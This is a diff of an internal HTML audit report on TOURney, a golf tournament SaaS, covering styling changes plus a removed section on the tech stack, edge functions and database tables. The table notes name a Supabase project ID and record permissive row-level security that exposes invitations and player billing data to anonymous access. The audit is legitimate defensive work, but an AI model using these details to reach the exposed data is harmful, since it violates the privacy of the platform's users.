@@ -3,826 +3,935 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TOURney — Claude Review · May 13, 2026</title>
+<title>Full Platform Review · TOURney Platform</title>
 <style>
-  :root {
-    --gold: #c09030;
-    --gold-light: #d4a840;
-    --gold-dim: rgba(192,144,48,0.18);
-    --ink: #1a1008;
-    --bg: #0d0a05;
-    --surface: #151009;
-    --card: #1c140a;
-    --card2: #221a0e;
-    --border: rgba(192,144,48,0.22);
-    --muted: #7a6a54;
-    --text: #e8dcc8;
-    --red: #c0392b;
-    --green: #27ae60;
-    --blue: #2980b9;
-    --orange: #e67e22;
-    --purple: #8e44ad;
-  }
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  html { scroll-behavior: smooth; }
-  body {
-    font-family: -apple-system, 'Segoe UI', system-ui, sans-serif;
-    background: var(--bg);
-    color: var(--text);
-    line-height: 1.6;
-    font-size: 15px;
-  }
-  nav {
-    position: sticky; top: 0; z-index: 100;
-    background: rgba(13,10,5,0.96);
-    border-bottom: 1px solid var(--border);
-    backdrop-filter: blur(12px);
-    padding: 0.6rem 1.5rem;
-    display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;
-  }
-  .nav-brand { color: var(--gold); font-weight: 700; font-size: 1rem; letter-spacing: 0.05em; white-space: nowrap; }
-  .nav-brand span { color: var(--muted); font-weight: 400; font-size: 0.8rem; margin-left: 0.4rem; }
-  .nav-links { display: flex; gap: 0.2rem; flex-wrap: wrap; margin-left: auto; }
-  .nav-links a { color: var(--muted); text-decoration: none; font-size: 0.78rem; padding: 0.3rem 0.55rem; border-radius: 4px; transition: all 0.15s; white-space: nowrap; }
-  .nav-links a:hover { color: var(--gold); background: var(--gold-dim); }
-  .hero { padding: 3.5rem 1.5rem 2.5rem; text-align: center; border-bottom: 1px solid var(--border); background: linear-gradient(180deg, rgba(192,144,48,0.06) 0%, transparent 100%); }
-  .hero-eyebrow { display: inline-block; font-size: 0.72rem; font-weight: 600; letter-spacing: 0.12em; text-transform: uppercase; color: var(--gold); border: 1px solid var(--border); border-radius: 20px; padding: 0.25rem 0.85rem; margin-bottom: 1.2rem; }
-  .hero h1 { font-size: clamp(1.8rem, 4vw, 2.8rem); font-weight: 800; color: #fff; margin-bottom: 0.5rem; }
-  .hero h1 span { color: var(--gold); }
-  .hero-sub { color: var(--muted); max-width: 560px; margin: 0 auto 1.5rem; font-size: 0.95rem; }
-  .hero-meta { display: flex; gap: 1.5rem; justify-content: center; flex-wrap: wrap; font-size: 0.78rem; color: var(--muted); }
-  .hero-meta span { display: flex; align-items: center; gap: 0.35rem; }
-  .wrapper { max-width: 1000px; margin: 0 auto; padding: 0 1.5rem; }
-  section { padding: 3rem 0; border-bottom: 1px solid var(--border); }
-  section:last-child { border-bottom: none; }
-  .section-header { margin-bottom: 2rem; }
-  .section-eyebrow { font-size: 0.7rem; font-weight: 700; letter-spacing: 0.14em; text-transform: uppercase; color: var(--gold); margin-bottom: 0.4rem; }
-  .section-title { font-size: 1.5rem; font-weight: 800; color: #fff; margin-bottom: 0.4rem; }
-  .section-desc { color: var(--muted); font-size: 0.88rem; max-width: 600px; }
-  .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.25rem 1.4rem; margin-bottom: 0.75rem; }
-  .card-title { font-size: 0.88rem; font-weight: 700; color: var(--gold); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
-  .card p, .card li { font-size: 0.86rem; color: var(--text); margin-bottom: 0.3rem; }
-  .card ul, .card ol { padding-left: 1.2rem; }
-  .card li { margin-bottom: 0.4rem; }
-  .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 0.75rem; }
-  .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 0.75rem; }
-  .stack-item { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.2rem; }
-  .stack-label { font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 0.25rem; }
-  .stack-value { font-size: 0.92rem; font-weight: 600; color: #fff; }
-  .stack-note { font-size: 0.75rem; color: var(--muted); margin-top: 0.2rem; }
-  .pill { display: inline-block; font-size: 0.68rem; font-weight: 700; letter-spacing: 0.06em; padding: 0.18rem 0.55rem; border-radius: 20px; text-transform: uppercase; }
-  .pill-gold { background: rgba(192,144,48,0.18); color: var(--gold); border: 1px solid rgba(192,144,48,0.3); }
-  .pill-green { background: rgba(39,174,96,0.15); color: var(--green); border: 1px solid rgba(39,174,96,0.3); }
-  .pill-red { background: rgba(192,57,43,0.15); color: var(--red); border: 1px solid rgba(192,57,43,0.3); }
-  .pill-orange { background: rgba(230,126,34,0.15); color: var(--orange); border: 1px solid rgba(230,126,34,0.3); }
-  .pill-blue { background: rgba(41,128,185,0.15); color: var(--blue); border: 1px solid rgba(41,128,185,0.3); }
-  .pill-purple { background: rgba(142,68,173,0.15); color: var(--purple); border: 1px solid rgba(142,68,173,0.3); }
-  .page-table { width: 100%; border-collapse: collapse; font-size: 0.82rem; }
-  .page-table th { text-align: left; padding: 0.6rem 0.8rem; border-bottom: 1px solid var(--border); color: var(--muted); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.08em; background: var(--surface); }
-  .page-table td { padding: 0.65rem 0.8rem; border-bottom: 1px solid rgba(192,144,48,0.08); vertical-align: top; }
-  .page-table tr:last-child td { border-bottom: none; }
-  .page-table tr:hover td { background: var(--gold-dim); }
-  .page-table .url { font-family: monospace; font-size: 0.78rem; color: var(--gold-light); }
-  .page-table .file { font-family: monospace; font-size: 0.75rem; color: var(--muted); }
-  .table-wrap { background: var(--card); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; overflow-x: auto; }
-  .idea-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 1.4rem; position: relative; overflow: hidden; }
-  .idea-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
-  .idea-1::before { background: var(--gold); }
-  .idea-2::before { background: var(--blue); }
-  .idea-3::before { background: var(--green); }
-  .idea-4::before { background: var(--orange); }
-  .idea-5::before { background: var(--purple); }
-  .idea-number { font-size: 2rem; font-weight: 900; opacity: 0.07; position: absolute; top: 0.5rem; right: 1rem; line-height: 1; color: #fff; }
-  .idea-tag { margin-bottom: 0.5rem; }
-  .idea-title { font-size: 1rem; font-weight: 700; color: #fff; margin-bottom: 0.5rem; }
-  .idea-body { font-size: 0.84rem; color: var(--muted); line-height: 1.55; margin-bottom: 0.75rem; }
-  .idea-why { font-size: 0.78rem; color: var(--text); }
-  .idea-why strong { color: var(--gold); }
-  .qa-flow { counter-reset: qa-step; }
-  .qa-step { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.1rem 1.25rem 1.1rem 4rem; margin-bottom: 0.6rem; position: relative; }
-  .qa-step::before { counter-increment: qa-step; content: counter(qa-step); position: absolute; left: 1.1rem; top: 50%; transform: translateY(-50%); width: 1.8rem; height: 1.8rem; background: var(--gold-dim); color: var(--gold); border: 1px solid var(--border); border-radius: 50%; font-size: 0.75rem; font-weight: 700; display: grid; place-items: center; }
-  .qa-step-title { font-size: 0.9rem; font-weight: 700; color: #fff; margin-bottom: 0.3rem; }
-  .qa-step-desc { font-size: 0.82rem; color: var(--muted); }
-  .qa-step-checks { margin-top: 0.5rem; }
-  .qa-step-checks li { font-size: 0.8rem; color: var(--text); margin-bottom: 0.2rem; list-style: none; padding-left: 1.1rem; position: relative; }
-  .qa-step-checks li::before { content: '☐'; position: absolute; left: 0; color: var(--muted); }
-  .bug-table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
-  .bug-table th { text-align: left; padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border); color: var(--muted); font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em; background: var(--surface); }
-  .bug-table td { padding: 0.55rem 0.75rem; border-bottom: 1px solid rgba(192,144,48,0.07); vertical-align: middle; }
-  .bug-table tr:last-child td { border-bottom: none; }
-  .bug-sev { width: 70px; }
-  .input-cell { background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 4px; padding: 0.3rem 0.5rem; color: var(--text); font-size: 0.78rem; width: 100%; min-width: 120px; font-family: inherit; }
-  select.input-cell option { background: var(--card); }
-  .roadmap-item { display: flex; gap: 1.2rem; align-items: flex-start; background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.1rem 1.25rem; margin-bottom: 0.6rem; }
-  .roadmap-icon { width: 2.2rem; height: 2.2rem; border-radius: 50%; background: var(--gold-dim); color: var(--gold); display: grid; place-items: center; font-size: 1rem; flex-shrink: 0; border: 1px solid var(--border); }
-  .roadmap-content { flex: 1; }
-  .roadmap-title { font-size: 0.92rem; font-weight: 700; color: #fff; margin-bottom: 0.2rem; }
-  .roadmap-desc { font-size: 0.82rem; color: var(--muted); margin-bottom: 0.4rem; }
-  .roadmap-action { font-size: 0.78rem; color: var(--text); }
-  .roadmap-action strong { color: var(--gold-light); }
-  .sec-item { background: var(--card); border: 1px solid var(--border); border-left: 3px solid var(--border); border-radius: 0 8px 8px 0; padding: 1rem 1.25rem; margin-bottom: 0.75rem; }
-  .sec-item.sev-high { border-left-color: var(--red); }
-  .sec-item.sev-med { border-left-color: var(--orange); }
-  .sec-item.sev-low { border-left-color: var(--green); }
-  .sec-item.sev-info { border-left-color: var(--blue); }
-  .sec-header { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.5rem; }
-  .sec-title { font-size: 0.9rem; font-weight: 700; color: #fff; }
-  .sec-body { font-size: 0.82rem; color: var(--muted); margin-bottom: 0.5rem; }
-  .sec-fix { font-size: 0.8rem; color: var(--text); background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 4px; padding: 0.5rem 0.7rem; }
-  .sec-fix strong { color: var(--gold-light); display: block; margin-bottom: 0.2rem; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.08em; }
-  code { font-family: 'Consolas', 'Monaco', monospace; background: rgba(255,255,255,0.07); padding: 0.1rem 0.3rem; border-radius: 3px; font-size: 0.82em; color: var(--gold-light); }
-  .score-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 0.6rem; margin-bottom: 1.5rem; }
-  .score-cell { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-align: center; }
-  .score-num { font-size: 2rem; font-weight: 900; line-height: 1; margin-bottom: 0.2rem; }
-  .score-label { font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em; color: var(--muted); }
-  .score-green { color: var(--green); }
-  .score-gold { color: var(--gold); }
-  .score-red { color: var(--red); }
-  .score-blue { color: var(--blue); }
-  footer { border-top: 1px solid var(--border); padding: 1.5rem; text-align: center; color: var(--muted); font-size: 0.75rem; }
-  footer span { color: var(--gold); }
-  @media (max-width: 600px) {
-    .nav-links { display: none; }
-    .hero { padding: 2rem 1rem 1.5rem; }
-    section { padding: 2rem 0; }
-  }
+:root{--gold:#c09030;--gold-light:#d4a840;--gold-dim:rgba(192,144,48,0.18);--bg:#0a0a0a;--surface:#111;--card:#161616;--card2:#1c1c1c;--border:#222;--border-gold:rgba(192,144,48,0.22);--text:#e8e8e8;--muted:#666;--radius:8px;--red:#c0392b;--green:#27ae60;--orange:#e67e22;--blue:#2980b9;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,'Segoe UI',system-ui,sans-serif;padding:0;font-size:15px;line-height:1.6;}
+nav{position:sticky;top:0;z-index:100;background:rgba(10,10,10,0.96);border-bottom:1px solid var(--border-gold);backdrop-filter:blur(12px);padding:0.6rem 1.5rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;}
+.nav-brand{color:var(--gold);font-weight:700;font-size:1rem;letter-spacing:0.05em;}
+.nav-brand span{color:var(--muted);font-weight:400;font-size:0.8rem;margin-left:0.4rem;}
+.nav-links{display:flex;gap:0.2rem;flex-wrap:wrap;margin-left:auto;}
+.nav-links a{color:var(--muted);text-decoration:none;font-size:0.78rem;padding:0.3rem 0.55rem;border-radius:4px;transition:all 0.15s;}
+.nav-links a:hover{color:var(--gold);background:var(--gold-dim);}
+.hero{padding:3rem 1.5rem 2rem;text-align:center;border-bottom:1px solid var(--border);background:linear-gradient(180deg,rgba(192,144,48,0.05) 0%,transparent 100%);}
+.hero-eyebrow{display:inline-block;font-size:0.72rem;font-weight:600;letter-spacing:0.12em;text-transform:uppercase;color:var(--gold);border:1px solid var(--border-gold);border-radius:20px;padding:0.25rem 0.85rem;margin-bottom:1.2rem;}
+.hero h1{font-size:clamp(1.8rem,4vw,2.6rem);font-weight:800;color:#fff;margin-bottom:0.4rem;}
+.hero h1 span{color:var(--gold);}
+.hero-meta{display:flex;gap:1.5rem;justify-content:center;flex-wrap:wrap;font-size:0.78rem;color:var(--muted);margin-top:1rem;}
+/* Lifecycle bar */
+.lifecycle{display:flex;gap:0;margin:2rem 1.5rem 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border);}
+.lc-stage{flex:1;padding:.5rem .25rem;text-align:center;font-size:.68rem;font-weight:600;background:var(--card);color:var(--muted);text-transform:uppercase;letter-spacing:.04em;}
+.lc-stage.active{background:var(--gold);color:#000;}
+.lc-stage.done{background:#1a2a1a;color:#4a8a4a;}
+/* Content wrapper */
+.wrapper{max-width:960px;margin:0 auto;padding:2rem 1.5rem;}
+/* Stage sections */
+.axis-stage{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:1.5rem;overflow:hidden;}
+.stage-header{display:flex;align-items:center;gap:.75rem;padding:.75rem 1rem;border-bottom:1px solid var(--border);flex-wrap:wrap;}
+.stage-pill{display:inline-block;font-size:.65rem;font-weight:700;letter-spacing:.08em;padding:.2rem .6rem;border-radius:20px;text-transform:uppercase;}
+.pill-audit{background:var(--gold-dim);color:var(--gold);border:1px solid var(--border-gold);}
+.pill-council{background:rgba(41,128,185,0.15);color:var(--blue);border:1px solid rgba(41,128,185,0.3);}
+.pill-qa{background:rgba(230,126,34,0.15);color:var(--orange);border:1px solid rgba(230,126,34,0.3);}
+.pill-biz{background:rgba(39,174,96,0.15);color:var(--green);border:1px solid rgba(39,174,96,0.3);}
+.pill-sec{background:rgba(192,57,43,0.15);color:var(--red);border:1px solid rgba(192,57,43,0.3);}
+.stage-date{font-size:.78rem;color:var(--muted);}
+.stage-agent{font-size:.72rem;color:var(--muted);margin-left:auto;}
+.stage-body{padding:1.25rem 1.4rem;}
+/* Cards */
+.card{background:var(--card2);border:1px solid var(--border);border-radius:var(--radius);padding:1.2rem 1.4rem;margin-bottom:.75rem;}
+.card-title{font-size:.9rem;font-weight:700;color:var(--gold);margin-bottom:.5rem;display:flex;align-items:center;gap:.5rem;flex-wrap:wrap;}
+.card p,.card li{font-size:.85rem;color:var(--text);margin-bottom:.3rem;}
+.card ul,.card ol{padding-left:1.2rem;}
+.card li{margin-bottom:.45rem;}
+.grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:.75rem;}
+.grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:.75rem;}
+/* Pills */
+.pill{display:inline-block;font-size:.65rem;font-weight:700;letter-spacing:.06em;padding:.18rem .55rem;border-radius:20px;text-transform:uppercase;}
+.pill-red   {background:rgba(192,57,43,0.15); color:var(--red);    border:1px solid rgba(192,57,43,0.3);}
+.pill-green {background:rgba(39,174,96,0.15); color:var(--green);  border:1px solid rgba(39,174,96,0.3);}
+.pill-orange{background:rgba(230,126,34,0.15);color:var(--orange); border:1px solid rgba(230,126,34,0.3);}
+.pill-blue  {background:rgba(41,128,185,0.15);color:var(--blue);   border:1px solid rgba(41,128,185,0.3);}
+.pill-gold  {background:var(--gold-dim);      color:var(--gold);   border:1px solid var(--border-gold);}
+.pill-gray  {background:rgba(255,255,255,0.05);color:var(--muted); border:1px solid var(--border);}
+.pill-purple{background:rgba(142,68,173,0.15);color:#9b59b6;      border:1px solid rgba(142,68,173,0.3);}
+/* Phase items */
+.phase-item{background:var(--card2);border:1px solid var(--border);border-left:3px solid var(--border);border-radius:0 var(--radius) var(--radius) 0;padding:1rem 1.25rem;margin-bottom:.75rem;}
+.phase-item.p0{border-left-color:#8b0000;}
+.phase-item.p1{border-left-color:var(--orange);}
+.phase-item.p2{border-left-color:var(--blue);}
+.phase-item.p3{border-left-color:var(--green);}
+.phase-item.blocked{border-left-color:var(--red);}
+.phase-item.idea-gold{border-left-color:var(--gold);}
+.phase-item.idea-blue{border-left-color:var(--blue);}
+.phase-item.idea-green{border-left-color:var(--green);}
+.phase-item.idea-orange{border-left-color:var(--orange);}
+.phase-item.idea-purple{border-left-color:#8e44ad;}
+.phase-header{display:flex;align-items:center;gap:.6rem;margin-bottom:.5rem;flex-wrap:wrap;}
+.phase-title{font-size:.9rem;font-weight:700;color:#fff;}
+.phase-body{font-size:.83rem;color:var(--muted);margin-bottom:.5rem;}
+.phase-ac{font-size:.8rem;color:var(--text);background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:4px;padding:.5rem .7rem;margin-top:.5rem;}
+.phase-ac strong{color:var(--gold-light);display:block;margin-bottom:.2rem;font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;}
+.phase-ac ul{padding-left:1.1rem;}
+.phase-ac li{font-size:.79rem;color:var(--text);margin-bottom:.25rem;}
+code{font-family:'Consolas','Monaco',monospace;background:rgba(255,255,255,0.07);padding:.1rem .3rem;border-radius:3px;font-size:.82em;color:var(--gold-light);}
+/* Overview grid */
+.overview-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:.75rem;margin-bottom:1.25rem;}
+.ov-card{background:var(--card2);border:1px solid var(--border);border-radius:var(--radius);padding:1rem;text-align:center;}
+.ov-val{font-size:1.6rem;font-weight:800;color:var(--gold);}
+.ov-val.grade-a{color:var(--green);}
+.ov-val.grade-b{color:var(--gold);}
+.ov-val.grade-c{color:var(--orange);}
+.ov-val.grade-d{color:var(--red);}
+.ov-label{font-size:.7rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-top:.2rem;}
+/* Tables */
+.page-table{width:100%;border-collapse:collapse;font-size:.82rem;}
+.page-table th{text-align:left;padding:.5rem .75rem;border-bottom:1px solid var(--border);font-size:.7rem;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);}
+.page-table td{padding:.6rem .75rem;border-bottom:1px solid rgba(34,34,34,0.5);vertical-align:top;}
+.page-table tr:last-child td{border-bottom:none;}
+.table-wrap{background:var(--card2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;overflow-x:auto;margin-bottom:.75rem;}
+/* Stack items */
+.stack-item{background:var(--card2);border:1px solid var(--border);border-radius:var(--radius);padding:.75rem 1rem;}
+.stack-label{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin-bottom:.2rem;}
+.stack-value{font-size:.88rem;font-weight:700;color:#fff;margin-bottom:.2rem;}
+.stack-note{font-size:.78rem;color:var(--muted);}
+/* Section label */
+.section-label{font-size:.7rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--gold);margin-bottom:.75rem;margin-top:1.25rem;}
+.section-label:first-child{margin-top:0;}
+/* QA steps */
+.qa-step{background:var(--card2);border:1px solid var(--border);border-left:3px solid var(--gold-dim);border-radius:0 var(--radius) var(--radius) 0;padding:.85rem 1.1rem;margin-bottom:.6rem;}
+.qa-step-title{font-size:.88rem;font-weight:700;color:#fff;margin-bottom:.2rem;}
+.qa-step-desc{font-size:.8rem;color:var(--muted);margin-bottom:.4rem;}
+.qa-checks{padding-left:1.2rem;margin-top:.35rem;}
+.qa-checks li{font-size:.79rem;color:var(--text);margin-bottom:.25rem;}
+/* Security findings */
+.sec-finding{background:var(--card2);border:1px solid var(--border);border-left:3px solid var(--border);border-radius:0 var(--radius) var(--radius) 0;padding:1rem 1.25rem;margin-bottom:.75rem;}
+.sec-finding.sev-high{border-left-color:#8b0000;}
+.sec-finding.sev-med{border-left-color:var(--orange);}
+.sec-finding.sev-low{border-left-color:var(--green);}
+.sec-finding.sev-info{border-left-color:var(--blue);}
+.sec-header{display:flex;align-items:center;gap:.6rem;margin-bottom:.5rem;flex-wrap:wrap;}
+.sec-title{font-size:.88rem;font-weight:700;color:#fff;}
+.sec-body{font-size:.83rem;color:var(--muted);margin-bottom:.5rem;}
+.sec-fix{font-size:.8rem;color:var(--text);background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:4px;padding:.5rem .7rem;margin-top:.5rem;}
+.sec-fix strong{color:var(--gold-light);display:block;margin-bottom:.3rem;font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;}
+/* Next action */
+.next-action{display:flex;align-items:flex-start;gap:.85rem;padding:.85rem 1rem;background:var(--card2);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:.5rem;}
+.na-num{font-size:1.2rem;font-weight:800;color:var(--gold);min-width:1.5rem;}
+.na-body{flex:1;}
+.na-title{font-size:.88rem;font-weight:700;color:#fff;margin-bottom:.2rem;}
+.na-detail{font-size:.8rem;color:var(--muted);}
+h3{font-size:1rem;font-weight:700;color:#fff;margin:1.25rem 0 .75rem;}
+/* Bug table */
+.bug-table{width:100%;border-collapse:collapse;font-size:.8rem;}
+.bug-table th{text-align:left;padding:.5rem .75rem;border-bottom:1px solid var(--border);font-size:.68rem;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);}
+.bug-table td{padding:.55rem .75rem;border-bottom:1px solid rgba(34,34,34,0.5);vertical-align:middle;}
+.bug-table tr:last-child td{border-bottom:none;}
+.input-cell{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.3rem .5rem;font-size:.78rem;color:var(--text);font-family:inherit;width:100%;}
+select.input-cell{cursor:pointer;}
+footer{text-align:center;padding:2rem 1.5rem;font-size:.75rem;color:var(--muted);border-top:1px solid var(--border);}
+footer span{color:var(--gold);}
+footer a{color:var(--muted);text-decoration:none;}
+footer a:hover{color:var(--gold);}
 </style>
 </head>
 <body>
 
 <nav>
-  <div class="nav-brand">TOURney <span>by Greenskeeper Studios</span></div>
+  <span class="nav-brand">TOURney <span>Platform Intelligence</span></span>
   <div class="nav-links">
-    <a href="#review">Review</a>
-    <a href="#council">Council</a>
-    <a href="#qa">QA Test</a>
-    <a href="#business">Business</a>
-    <a href="#security">Security</a>
+    <a href="/platform">← Platform</a>
+    <a href="/platform/finance">Finance Axis</a>
   </div>
 </nav>
 
 <div class="hero">
-  <div class="hero-eyebrow">Internal Report</div>
-  <h1><span>TOURney</span> — Full Platform Review</h1>
-  <p class="hero-sub">Code-to-business audit, council of ideas, full QA protocol, business roadmap, and security analysis.</p>
+  <div class="hero-eyebrow">Full Platform Review</div>
+  <h1>TOURney — <span>May 13, 2026</span></h1>
   <div class="hero-meta">
-    <span>📅 May 13, 2026</span>
-    <span>🤖 Claude Sonnet 4.6</span>
-    <span>🏢 Greenskeeper Studios</span>
-    <span>🔒 Internal Only</span>
+    <span>May 13, 2026</span>
+    <span>Claude Sonnet 4.6</span>
+    <span>Greenskeeper Studios Internal</span>
+    <span>8 axes · 5 sections</span>
   </div>
 </div>
 
-<section id="review">
+<div class="lifecycle" id="lifecycle-bar">
+  <div class="lc-stage active" id="lc-audit">Audit</div>
+  <div class="lc-stage" id="lc-council">Council</div>
+  <div class="lc-stage" id="lc-qa">QA</div>
+  <div class="lc-stage" id="lc-business">Business</div>
+  <div class="lc-stage" id="lc-security">Security</div>
+  <div class="lc-stage" id="lc-concluded">Concluded</div>
+</div>
+
 <div class="wrapper">
+<div id="stage-history">
 
-<div class="section-header">
-  <div class="section-eyebrow">§1 — Code-to-Business Audit</div>
-  <div class="section-title">Platform Review</div>
-  <div class="section-desc">Evidence-based grades across all axes. Every claim cites a migration, file:line, or policy name.</div>
-</div>
-
-<p style="font-size:0.84rem;color:var(--muted);margin-bottom:1.5rem;padding:0.75rem 1rem;background:var(--card);border-left:3px solid var(--gold);border-radius:0 6px 6px 0;">
-  TOURney is a multi-tenant golf tournament SaaS PWA. One live tenant (Bova Invitational). The Bova Invitational ran as a real 3-day event — it is now a reference tenant and proof-of-concept. The platform has 11 versioned migrations, a full edge function suite (Stripe, push, email), a self-documenting ops hub at <code>/platform</code>, and PWA cache at <code>tourney-v34</code>. LLC not yet formed; Stripe live keys not set. That is the entire pre-launch gap.
-</p>
-
-<div class="score-grid">
-  <div class="score-cell"><div class="score-num score-green">A</div><div class="score-label">Architecture</div></div>
-  <div class="score-cell"><div class="score-num score-gold">B+</div><div class="score-label">Feature Depth</div></div>
-  <div class="score-cell"><div class="score-num score-gold">B+</div><div class="score-label">UX Polish</div></div>
-  <div class="score-cell"><div class="score-num score-gold">B</div><div class="score-label">Security</div></div>
-  <div class="score-cell"><div class="score-num score-gold">B</div><div class="score-label">Data Model</div></div>
-  <div class="score-cell"><div class="score-num score-gold">B+</div><div class="score-label">Deployment</div></div>
-  <div class="score-cell"><div class="score-num score-gold">B</div><div class="score-label">Performance</div></div>
-  <div class="score-cell"><div class="score-num score-red">C+</div><div class="score-label">Business Ready</div></div>
-</div>
-
-<div class="card-title" style="margin-bottom:0.75rem;">Tech Stack</div>
-<div class="grid-3" style="margin-bottom:1.5rem;">
-  <div class="stack-item"><div class="stack-label">Frontend</div><div class="stack-value">Vanilla JS MPA</div><div class="stack-note">No framework. Inline JS per page. 25+ HTML pages served static from Vercel.</div></div>
-  <div class="stack-item"><div class="stack-label">Backend / DB</div><div class="stack-value">Supabase</div><div class="stack-note">Project jllugkiojeoopitdvzsa. RLS on all tables. Realtime on scorecard.</div></div>
-  <div class="stack-item"><div class="stack-label">Hosting</div><div class="stack-value">Vercel (static)</div><div class="stack-note">tourney.greenskeeper.studio + bova.greenskeeper.studio. Full security headers.</div></div>
-  <div class="stack-item"><div class="stack-label">PWA Cache</div><div class="stack-value">tourney-v34</div><div class="stack-note">sw.js: cache-first assets, network-first HTML, JSON bypass. 22 precached files.</div></div>
-  <div class="stack-item"><div class="stack-label">Init Layer</div><div class="stack-value">tourney-init.js</div><div class="stack-note">Detects slug, fetches tournament row, injects brand, exposes window.tourney.db + window.tourney.ready.</div></div>
-  <div class="stack-item"><div class="stack-label">Routing</div><div class="stack-value">vercel.json rewrites</div><div class="stack-note">/t/:slug/* → per-page HTML. /platform/:slug catch-all for ops artifacts.</div></div>
-</div>
-
-<div class="card-title" style="margin-bottom:0.75rem;">Edge Functions</div>
-<div class="grid-3" style="margin-bottom:1.5rem;">
-  <div class="stack-item"><div class="stack-label">create-checkout</div><div class="stack-value">Stripe Checkout Session</div><div class="stack-note">JWT-gated. Creates Stripe session for /player-upgrade. Secret key held server-side.</div></div>
-  <div class="stack-item"><div class="stack-label">stripe-webhook</div><div class="stack-value">Stripe → DB Sync</div><div class="stack-note">Sig-verified. Handles checkout.completed, subscription.*, invoice.payment_failed. Updates player_accounts.billing_status.</div></div>
-  <div class="stack-item"><div class="stack-label">create-player-checkout</div><div class="stack-value">Player Upgrade Flow</div><div class="stack-note">Secondary checkout entry for player billing path.</div></div>
-  <div class="stack-item"><div class="stack-label">send-push</div><div class="stack-value">Web Push Notifications</div><div class="stack-note">v9 deployed. JWT auth + owner/admin check. Sends to push_subscriptions for a tournament.</div></div>
-  <div class="stack-item"><div class="stack-label">send-install-email</div><div class="stack-value">Onboarding Email</div><div class="stack-note">v4 deployed. Webhook secret gate (SEND_INSTALL_EMAIL_SECRET). MANUAL PENDING: Rob must set env var + update DB webhook header.</div></div>
-</div>
-
-<div class="card-title" style="margin-bottom:0.75rem;">Database Tables (11 migrations)</div>
-<div class="table-wrap" style="margin-bottom:1.5rem;">
-  <table class="page-table">
-    <thead><tr><th>Table</th><th>Migration</th><th>Key Columns</th><th>RLS Status</th></tr></thead>
-    <tbody>
-      <tr><td>tournaments</td><td class="file">001_add_tournaments.sql</td><td><code>slug, tier, stripe_subscription_id, stripe_status, status, owner_email</code></td><td><span class="pill pill-gold">SELECT USING(true)</span></td></tr>
-      <tr><td>tournament_admins</td><td class="file">001 + 004</td><td><code>tournament_id, email</code></td><td><span class="pill pill-gold">SELECT USING(true)</span></td></tr>
-      <tr><td>players</td><td class="file">001 (pre-multi-tenant)</td><td><code>tournament_id, name, email, team, handicap, trash_talk, why_me</code></td><td><span class="pill pill-orange">Permissive — verify live</span></td></tr>
-      <tr><td>scores</td><td class="file">001 (pre-multi-tenant)</td><td><code>tournament_id, player_id, round, hole, strokes</code></td><td><span class="pill pill-orange">Permissive — verify live</span></td></tr>
-      <tr><td>settings</td><td class="file">001 + 003_tighten_settings_rls</td><td><code>tournament_id, key, value</code></td><td><span class="pill pill-green">Admin-gated write</span></td></tr>
-      <tr><td>invitations</td><td class="file">005_invitations_and_accounts</td><td><code>tournament_id, email, code, used_at</code></td><td><span class="pill pill-orange">anon SELECT/UPDATE USING(true) — 008 partially fixed</span></td></tr>
-      <tr><td>player_accounts</td><td class="file">005_invitations_and_accounts</td><td><code>email, billing_status, billing_expires_at, billing_ref</code></td><td><span class="pill pill-orange">anon SELECT USING(true) — exposes billing data</span></td></tr>
-      <tr><td>rounds</td><td class="file">007_round_model</td><td><code>tournament_id, round_number, name, format, status</code></td><td><span class="pill pill-green">SELECT USING(true) / write admin-gated (011)</span></td></tr>
-      <tr><td>push_subscriptions</td><td class="file">001 + 010</td><td><code>tournament_id, endpoint, p256dh, auth</code></td><td><span class="pill pill-green">Tightened in 010</span></td></tr>
-    </tbody>
-  </table>
-</div>
-
-<div class="card-title" style="margin-bottom:0.75rem;">Platform Pages</div>
